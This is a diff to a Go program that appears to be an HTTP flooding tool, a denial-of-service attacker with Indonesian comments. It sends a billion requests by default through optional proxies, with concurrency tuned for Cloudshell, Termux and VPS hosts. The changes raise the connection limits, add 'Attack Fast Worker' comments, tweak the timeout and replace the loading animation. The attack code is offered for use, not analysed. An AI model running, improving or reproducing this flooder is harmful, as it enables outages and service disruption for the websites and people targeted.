@@ -1,4 +1,5 @@
 
+
 package main
 
 import (
@@ -67,8 +68,8 @@ func FastSpamRequests(Link string, numRequests int64, concurrency int, timeout t
 	// Jangan di otak atik ini udah pas super fast no komen.
 	transport := &http.Transport{
 		Proxy:               proxyFunc,
-		MaxIdleConns:        25000,
-		MaxIdleConnsPerHost: 25000,
+		MaxIdleConns:        50000,
+		MaxIdleConnsPerHost: 50000,
 		IdleConnTimeout:     2 * time.Second,
 		TLSHandshakeTimeout: 200 * time.Millisecond,
 		DialContext: (&net.Dialer{
@@ -129,9 +130,11 @@ func (lt *FastRequests) sendRequest(ctx context.Context) {
 func (lt *FastRequests) run(ctx context.Context, wg *sync.WaitGroup) {
     defer wg.Done()
     
-    // Worker Attack Combo
+    // Pembantu pemercepat
     jobs := make(chan struct{}, lt.concurrency)
     var workerWg sync.WaitGroup
+
+    // Play Fast Attack
     workerWg.Add(lt.concurrency)
     for i := 0; i < lt.concurrency; i++ {
         go func() {
@@ -147,6 +150,8 @@ func (lt *FastRequests) run(ctx context.Context, wg *sync.WaitGroup) {
             }
         }()
     }
+
+    // Attack Fast Worker
     go func() {
         defer close(jobs)
         for i := int64(0); i < lt.numRequests; i++ {
@@ -157,6 +162,7 @@ func (lt *FastRequests) run(ctx context.Context, wg *sync.WaitGroup) {
             }
         }
     }()
+
     workerWg.Wait()
 }
 
@@ -180,7 +186,7 @@ func printLogo() {
 }
 
 func animate(ctx context.Context, lt *FastRequests, initialCycleDuration, summaryDuration, updateInterval time.Duration) {
-	symbols := []string{"⚡"}
+	symbols := []string{"⬒", "⬓", "⬔", "⬕"}
 	symbolIndex := 0
 	currentCycleDuration := initialCycleDuration
 	startCycle := time.Now()
@@ -263,12 +269,12 @@ func main() {
 	configPath := flag.String("config", "", "FILE JSON")
 	requestsFlag := flag.Int64("requests", 1000000000, "TOTAL REQUESTS")
 	concurrencyFlag := flag.Int("concurrency", 550, "CONCURRENCY")  //Jangan di lebihkan! 550 Cloudshell & 200 Termux & 750 Vps. Biar di seting sama gua.
-	timeoutFlag := flag.Float64("timeout", 2.9, "WAKTU SETIAP REQUEST") // Jangan di set ulang
+	timeoutFlag := flag.Float64("timeout", 2.8, "WAKTU SETIAP REQUEST") // Jangan di set ulang
 	methodFlag := flag.String("method", "GET", "HTTP METHOD")
 	logFlag := flag.String("log", "ERROR", "DEBUG, INFO, WARNING, ERROR")
 	noLiveFlag := flag.Bool("no-live", false, "MATIKAN LIVE OUTPUT")
 	proxyFile := flag.String("proxy", "", "FILE PROXY") //Gak perlu boar ngebut pake 1 ip real aja
-	updateIntervalFlag := flag.Float64("animasi", 0.10, "KECEPATAN LOADING")
+	updateIntervalFlag := flag.Float64("update-interval", 0.10, "KECEPATAN LOADING")
 	flag.Parse()
 	if strings.ToUpper(*logFlag) == "DEBUG" {
 		log.SetOutput(os.Stdout)
@@ -299,7 +305,7 @@ func main() {
 	//Sengaja biar requests ngebut
 	method := strings.ToUpper(*methodFlag)
 	headers := map[string]string{
-		"Connection":      "keep-alive",  //katanya ai biar aktif requestsnya ga lemot bikin ulang mulu
+		"Connection":      "keep-alive", 
 	}
 	var proxies []string
 	if *proxyFile != "" {
